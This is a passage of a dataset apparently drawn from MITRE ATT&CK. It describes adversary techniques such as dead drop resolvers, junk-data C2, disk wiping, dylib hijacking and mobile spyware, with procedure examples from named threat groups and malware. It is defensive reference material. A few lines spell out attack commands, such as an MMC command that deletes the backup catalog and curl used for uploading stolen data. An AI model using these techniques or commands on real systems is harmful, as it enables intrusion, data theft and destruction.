Pastebin hosting updated malware.', 'During [C0017] [APT41] used dead drop resolvers on two separate tech community forums for their [KEYPLUG] Windows-version backdoor; notably [APT41] updated the community forum posts frequently with new dead drop resolvers during the campaign.', '[BLACKCOFFEE] uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.', '[RTM] has used an RSS feed on Livejournal to update a list of encrypted C2 server names. [RTM] has also hidden [Pony] C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.', '[APT41] used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.', '[PolyglotDuke] can use Twitter, Reddit, Imgur and other websites to get a C2 URL.', '[RTM] has used an RSS feed on Livejournal to update a list of encrypted C2 server names.', '[BRONZE BUTLER] MSGET downloader uses a dead drop resolver to access malicious payloads.', '[Patchwork] hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.', '[Javali] can read C2 information from Google Documents and YouTube.', '[Xbash] can obtain a webpage hosted on Pastebin to update its C2 domain list.']",
T1001.001,Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ","['[P2P ZeuS] added junk data to outgoing UDP packets to peer implants.', '[Downdelph] inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.', '[Mori] has obfuscated the FML.dll with 200MB of junk data.', '[BendyBear] has used byte randomization to obscure its behavior.', '[TrailBlazer] has used random identifier strings to obscure its C2 operations and result codes.', '[Uroburos] can add extra characters in encoded strings to help mimic DNS legitimate requests.', '[P8RAT] can send randomly-generated data as part of its C2 communication.', '[PLEAD] samples were found to be highly obfuscated with junk code.', '[Kevin] can generate a sequence of dummy HTTP C2 requests to obscure traffic.', '[GoldMax] has used decoy traffic to surround its malicious network traffic to avoid detection.', '[SUNBURST] added junk bytes to its C2 over HTTP.', '[Turian] can insert pseudo-random characters into its network encryption setup.', '[GrimAgent]  can pad C2 messages with random generated values.', '[APT28] added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.', '[WellMess] can use junk data in the Base64 string for additional obfuscation.']",False
T1598.001,Spearphishing Service,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts] or [Compromise Accounts] and/or sending multiple, seemingly urgent messages.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media] or [Search Victim-Owned Websites] to craft persuasive and believable lures.",['During [C0027] [Scattered Spider] sent Telegram messages impersonating IT personnel to harvest credentials.'],
T1552.007,Container API,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.  An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",['[Peirates] can query the Kubernetes API for secrets.'],False
T1584.001,Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.  Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.  Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.","['[Magic Hound] has used compromised domains to host links targeted to specific phishing victims.', '[SideCopy] has compromised domains for some of their infrastructure, including for C2 and staging malware.', 'For the [SolarWinds Compromise] [APT29] compromised domains to use for C2.', '[Transparent Tribe] has compromised domains for use in targeted malicious campaigns.', 'For [Operation Dream Job] [Lazarus Group] compromised domains in Italy and other countries for their C2 infrastructure.', 'For [C0021] the threat actors used legitimate but compromised domains to host malicious payloads.', 'During [C0010] UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.', '[Mustard Tempest] operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.', '[Kimsuky] has compromised legitimate sites and used them to distribute malware.', '[APT1] hijacked FQDNs associated with legitimate websites hosted by hop points.', '[Lazarus Group] has compromised legitimate domains, including those hosted in the US and Italy, for C2.', '[UNC2452] has compromised domains to use for C2.', '[APT29] has compromised domains to use for C2.']",False
T1505.001,SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).  Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.   Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands. ","['During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used various MS-SQL stored procedures.', '[Stuxnet] used xp_cmdshell to store and execute SQL code.', '[Sandworm Team] has used various MS-SQL stored procedures.  ']",
T1556.004,Network Device Authentication,"Adversaries may use [Patch System Image] to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.  [Modify System Image] may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.","['[SLOWPULSE] can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.', '[SYNful Knock] has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device.']",
T1561.001,Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.  Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like [RawDisk] to directly access disk content. This behavior is distinct from [Data Destruction] because sections of the disk are erased instead of individual files.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts] [OS Credential Dumping] and [SMB/Windows Admin Shares]","['[AcidRain] iterates over device file identifiers on the target, opens the device file, and either overwrites the file or calls various IOCTLS commands to erase it.', ""[WhisperGate] can overwrite sectors of a victim host's hard drive at periodic offsets."", '[Lazarus Group] has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.', '[RawDisk] has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.', '[MegaCortex] can wipe deleted data from all drives using <code>cipher.exe</code>.', '[StoneDrill] can wipe the accessible physical or logical drives of the infected machine.\t', '[HermeticWiper] has the ability to corrupt disk partitions and obtain raw disk access to destroy data.', '[BlackCat] has the ability to wipe VM snapshots on compromised networks.']",False
T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ","['[Lazarus Group] malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.', '[FIN8] has used FTP to exfiltrate collected data.', '[Remsec] can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.', '[CookieMiner] has used the <code>curl --upload-file</code> command to exfiltrate data over HTTP.', '[ccf32] can upload collected data and files to an FTP server.', '[WARPWIRE] can send captured credentials to C2 via HTTP `GET` or `POST` requests.', '[KONNI] has used FTP to exfiltrate reconnaissance data out.', ""Some [Brave Prince] variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command."", '[CharmPower] can send victim data via FTP with credentials hardcoded in the script.', '[CosmicDuke] exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.', '[Thrip] has used WinSCP to exfiltrate data from a targeted organization over FTP.', '[APT32] backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.', '[CORALDECK] has exfiltrated data in HTTP POST headers.', '[Wizard Spider] has exfiltrated victim information using FTP.', '[Agent Tesla] has routines for exfiltration over SMTP, FTP, and HTTP.', '[PoetRAT] has used [ftp] for exfiltration.', 'During [C0017] [APT41] exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.', '[OilRig] has exfiltrated data over FTP separately from its primary C2 channel over DNS.', '[Carbon] uses HTTP to send data to the C2 server.', '[BITSAdmin] can be used to create [BITS Jobs] to upload files from a compromised host.', '[Dok] exfiltrates logs of its execution stored in the <code>/tmp</code> folder over FTP using the <code>curl</code> command. ', '[APT33] has used FTP to exfiltrate files (separately from the C2 channel).', '[ftp] may be used to exfiltrate data separate from the main command and control protocol.', '[FIN6] has sent stolen payment card data to remote servers via HTTP POSTs.', '[Kessel] can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.', '[WindTail] has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.', '[SocGholish] can exfiltrate data directly to its C2 domain via HTTP.', '[Cherry Picker] exfiltrates files over FTP.', '[Rclone] can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.']",False
T1574.004,Dylib Hijacking,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.  Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.",['[Empire] has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.'],False
T1601.002,Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.   On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.  Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption]  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image]  ",[],
T1078.003,Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.  Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping] Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ","['[Kimsuky] has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.', '[Emotet] can brute force a local admin password, then use it to facilitate lateral movement.', '[Cobalt Strike] can use known credentials to run commands and spawn processes as a local user account.', '[PROMETHIUM] has created admin accounts on a compromised host.', '[FIN10] has moved laterally using the Local Administrator account.', '[APT32] has used legitimate local admin account credentials.', '[Tropic Trooper] has used known administrator account credentials to execute the backdoor directly.\t', '[HAFNIUM] has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.', '[FIN7] has used compromised credentials for access as SYSTEM on Exchange servers.', ""During the [SolarWinds Compromise] [APT29] used compromised local accounts to access victims' networks."", '[APT29] targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.', '[NotPetya] can use valid credentials with [PsExec] or <code>wmic</code> to spread itself to remote systems.', '[Umbreon] creates valid local users to provide access to the system.', 'During [Operation Wocao] threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.', '[Turla] has abused local accounts that have the same password across the victim’s network.', ""[APT29] has used compromised local accounts to access victims' networks."", '[Stolen Pencil] has a tool to add a Windows admin account in order to allow them to ensure continued access via RDP. ', '[Operation Wocao] has used local account credentials found during the intrusion for lateral movement and privilege escalation.', '[Cobalt Strike] can use known credentials to run commands and spawn processes as a local user account.']",False
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.  For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window.   Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery] without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).  Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model] class object. Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.",[],False
T1564.010,Process Argument Spoofing,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.  Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing] can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API] <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.  Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.  This behavior may also be combined with other tricks (such as [Parent PID Spoofing] to manipulate or further evade process-based detections.","['[Cobalt Strike] can use spoof arguments in spawned processes that execute beacon commands.', '[SombRAT] has the ability to modify its process memory to hide process command-line arguments.']",
T1574.012,COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.  The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model] (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.  Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control] if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses] provided by .NET processes.","['[Blue Mockingbird] has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.', '[DarkTortilla] can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.']",
T1603,Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. On Android and iOS, APIs and libraries exist to facilitate scheduling tasks to execute at a specified date, time, or interval.  On Android, the `WorkManager` API allows asynchronous tasks to be scheduled with the system. `WorkManager` was introduced to unify task scheduling on Android, using `JobScheduler`, `GcmNetworkManager`, and `AlarmManager` internally. `WorkManager` offers a lot of flexibility for scheduling, including periodically, one time, or constraint-based (e.g. only when the device is charging).  On iOS, the `NSBackgroundActivityScheduler` API allows asynchronous tasks to be scheduled with the system. The tasks can be scheduled to be repeating or non-repeating, however, the system chooses when the tasks will be executed. The app can choose the interval for repeating tasks, or the delay between scheduling and execution for one-time tasks.","['[TERRACOTTA] has used timer events in React Native to initiate the foreground service.', '[GPlayed] has used timers to enable Wi-Fi, ping the C2 server, register the device with the C2, and register wake locks on the system.', '[Tiktok Pro] has contained an alarm that triggers every three minutes and timers for communicating with the C2.']",
T1540,Code Injection,"Adversaries may use code injection attacks to implant arbitrary code into the address space of a running application. Code is then executed or interpreted by that application. Adversaries utilizing this technique may exploit capabilities to load code in at runtime through dynamic libraries.  With root access, `ptrace` can be used to target specific applications and load shared libraries into its process memory. By injecting code, an adversary may be able to gain access to higher permissions held by the targeted application by executing as the targeted application. In addition, the adversary may be able to evade detection or enable persistent access to a system under the guise of the application’s process. ",[],True
T1638,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices to support follow-on behaviors such as [Transmitted Data Manipulation] or [Endpoint Denial of Service]       [Adversary-in-the-Middle] can be achieved through several mechanisms, such as a malicious application registering itself as a VPN client. By doing this, the adversary can effectively redirect device traffic to wherever they want. However, registering as a VPN client requires user consent on both Android and iOS. Additionally, on iOS, the application requires a special entitlement that must be granted by Apple. Alternatively, if an application is able to escalate privileges, it can potentially utilize those privileges to gain access to network traffic.       Outside of a mobile device, adversaries may be able to capture traffic by employing a rogue base station or Wi-Fi access point. These devices will allow adversaries to capture network traffic after it has left the device, while it is flowing to its destination. On a local network, enterprise techniques could be used, such as DNS redirection or DNS poisoning.       If applications properly encrypt their network traffic, sensitive data may not be accessible an adversary, depending on the point of capture. ","['Most [KeyRaider] samples hook SSLRead and SSLWrite functions in the itunesstored process to intercept device communication with the Apple App Store.', ""[Monokle] can install attacker-specified certificates to the device's trusted certificate store, enabling an adversary to perform adversary-in-the-middle attacks."", '[S.O.V.A.] has included adversary-in-the-middle capabilities.']",False
T1626,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevated privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can gain on a machine. Authorization has to be granted to specific users in order to perform tasks that are designated as higher risk. An adversary can use several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system. ,[],False
T1663,Remote Access Software,"Adversaries may use legitimate remote access software, such as `VNC`, `TeamViewer`, `AirDroid`, `AirMirror`, etc., to establish an interactive command and control channel to target mobile devices.    Remote access applications may be installed and used post-compromise as an alternate communication channel for redundant access or as a way to establish an interactive remote session with the target device. They may also be used as a component of malware to establish a reverse connection to an adversary-controlled system or service. Installation of remote access tools may also include persistence.  ",['[Escobar] can use VNC to remotely control an infected device.'],False
T1454,Malicious SMS Message,Test,['Pegasus was delivered via an SMS message containing a link to a web site with malicious code.'],True
T1470,Obtain Device Cloud Backups,"An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use that access to obtain sensitive data stored in device backups. For example, the Elcomsoft Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's iCloud . Elcomsoft also describes  obtaining WhatsApp communication histories from backups stored in iCloud.",[],False
T1630,Indicator Removal on Host,"Adversaries may delete, alter, or hide generated artifacts on a device, including files, jailbreak status, or the malicious application itself. These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of mobile security solutions by causing notable events or information to go unreported.",['[Chameleon] can remove artifacts of its presence and uninstall itself.'],False
T1474,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.  Supply chain compromise can take place at any stage of the supply chain including:  * Manipulation of development tools * Manipulation of a development environment * Manipulation of source code repositories (public or private) * Manipulation of source code in open-source dependencies * Manipulation of software update/distribution mechanisms * Compromised/infected system images * Replacement of legitimate software with modified versions * Sales of modified/counterfeit products to legitimate distributors * Shipment interdiction  While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency, specifically with the widespread usage of third-party advertising libraries.",[],False
T1425,Insecure Third-Party Libraries,,[],True
T1636,Protected User Data,"Adversaries may utilize standard operating system APIs to collect data from permission-backed data stores on a device, such as the calendar or contact list. These permissions need to be declared ahead of time. On Android, they must be included in the application’s manifest. On iOS, they must be included in the application’s `Info.plist` file.       In almost all cases, the user is required to grant access to the data store that the application is trying to access. In recent OS versions, vendors have introduced additional privacy controls for users, such as the ability to grant permission to an application only while the application is being actively used by the user.      If the device has been jailbroken or rooted, an adversary may be able to access [Protected User Data] without the user’s knowledge or approval. ",[],False
T1418,Software Discovery,"Adversaries may attempt to get a listing of applications that are installed on a device. Adversaries may use the information from [Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempts specific actions.      Adversaries may attempt to enumerate applications for a variety of reasons, such as figuring out what security measures are present or to identify the presence of target applications. ","['[S.O.V.A.] can search for installed applications that match a list of targets.', '[Desert Scorpion] can obtain a list of installed applications.', '[TangleBot] can obtain a list of installed applications.', '[Pallas] retrieves a list of all applications installed on the device.', '[WolfRAT] can obtain a list of installed applications.', '[FakeSpy] can collect a list of installed applications.', '[CarbonSteal] has looked for specific applications, such as MiCode.', '[Riltok] can retrieve a list of installed applications. Installed application names are then checked against an adversary-defined list of targeted applications.', '[TrickMo] can collect a list of installed applications.', '[ViceLeaker] can obtain a list of installed applications.', '[GPlayed] can collect a list of installed applications.', '[HenBox] can obtain a list of running apps.', '[EventBot] can collect a list of installed applications.', '[Triada] is able to modify code within the com.android.systemui application to gain access to `GET_REAL_TASKS` permissions. This permission enables access to information about applications currently on the foreground and other recently used apps. ', '[Chameleon] can read the name of application packages.', '[INSOMNIA] can obtain a list of installed non-Apple applications.', '[Agent Smith] obtains the device’s application list.', '[Anubis] can collect a list of installed applications to compare to a list of targeted applications.', '[DEFENSOR ID] can retrieve a list of installed applications.', '[Android/AdDisplay.Ashas] has checked to see how many apps are installed, and specifically if Facebook or FB Messenger are installed.', '[Tiktok Pro] can obtain a list of installed applications.', '[Hornbill] can search for installed applications such as WhatsApp. ', '[AbstractEmu] can obtain a list of installed applications.', '[Rotexy] retrieves a list of installed applications and sends it to the command and control server.', '[Ginp] can obtain a list of installed applications.', '[TERRACOTTA] can obtain a list of installed apps.', '[Sunbird] can exfiltrate a list of installed applications.', '[GolfSpy] can obtain a list of installed applications.', '[Cerberus] can obtain a list of installed applications.', '[Mandrake] can obtain a list of installed applications.', ' [FlexiSpy] can retrieve a list of installed applications. ', '[GoldenEagle] has collected a list of installed application names.', '[Golden Cup] can obtain a list of installed applications.', '[BOULDSPY] can retrieve the list of installed applications.', '[YiSpecter] has collected information about installed applications.', '[DoubleAgent] has accessed the list of installed apps.', '[Red Alert 2.0] can obtain the running application.', '[Stealth Mango] uploads information about installed packages.', '[Pegasus for Android] accesses the list of installed applications.', '[Monokle] can list applications installed on the device.', ' [Exodus] Two can obtain a list of installed applications. ']",False
T1424,Process Discovery,"Adversaries may attempt to get information about running processes on a device. Information obtained could be used to gain an understanding of common software/applications running on devices within a network. Adversaries may use the information from [Process Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.      Recent Android security enhancements have made it more difficult to obtain a list of running processes. On Android 7 and later, there is no way for an application to obtain the process list without abusing elevated privileges. This is due to the Android kernel utilizing the `hidepid` mount feature. Prior to Android 7, applications could utilize the `ps` command or examine the `/proc` directory on the device.      In iOS, applications have previously been able to use the `sysctl` command to obtain a list of running processes. This functionality has been removed in later iOS versions. ","['[SharkBot] can use Accessibility Services to detect which process is in the foreground.', '[Anubis] can collect a list of running processes.', '[YiSpecter] has collected information about running processes.', '[Agent Smith] checks if a targeted application is running in user-space prior to infection. ', '[HenBox] can obtain a list of running processes.', '[Rotexy] collects information about running processes.', '[WolfRAT] uses `dumpsys` to determine if certain applications are running.', '[GolfSpy] can obtain a list of running processes.']",False
T1434,App Delivered via Email Attachment,,['The Android/Chuli.A malware was delivered via a spear phishing message sent to activist groups containing a malicious Android application as an attachment.'],True
T1629,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may span both native defenses as well as supplemental capabilities installed by users or mobile endpoint administrators.",[],False
T1453,Abuse Accessibility Features,"**This technique has been deprecated. Please use [Input Capture] [Input Injection] and [Input Prompt] where appropriate.**  A malicious app could abuse Android's accessibility features to capture sensitive data or perform other malicious actions.  Adversaries may abuse accessibility features on Android to emulate a user's clicks, for example to steal money from a user's bank account.  Adversaries may abuse accessibility features on Android devices to evade defenses by repeatedly clicking the ""Back"" button when a targeted app manager or mobile security app is launched, or when strings suggesting uninstallation are detected in the foreground. This effectively prevents the malicious application from being uninstalled.",[],
T1428,Exploitation of Remote Services,"Adversaries may exploit remote services of enterprise servers, workstations, or other resources to gain unauthorized access to internal systems once inside of a network. Adversaries may exploit remote services by taking advantage of a mobile device’s access to an internal enterprise network through local connectivity or through a Virtual Private Network (VPN). Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.   An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning] or other Discovery methods. These look for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.  Depending on the permissions level of the vulnerable remote service, an adversary may achieve [Exploitation for Privilege Escalation] as a result of lateral movement exploitation as well. ","['[DressCode] sets up a ""general purpose tunnel"" that can be used by an adversary to compromise enterprise networks that the mobile device is connected to.', '[NotCompatible] has the capability to exploit systems on an enterprise network.']",False
T1635,Steal Application Access Token,"Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering or URI hijacking and typically requires user action to grant access, such as through a system “Open With” dialogue.    Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework used to issue tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry through OAuth 2.0 using a variety of authorization protocols. An example of a commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested without requiring user credentials.",[],False
T1633,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors after checking for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the payload. They may also search for VME artifacts before dropping further payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion] during automated discovery to shape follow-on behaviors.   Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion] such as checking for system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. ",['[AbstractEmu] has used code abstraction and anti-emulation checks to potentially avoid running while under analysis.'],False
T1579,Keychain,"Adversaries may collect the keychain storage data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials.  On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, an adversary can access the entire encrypted database.",[],True
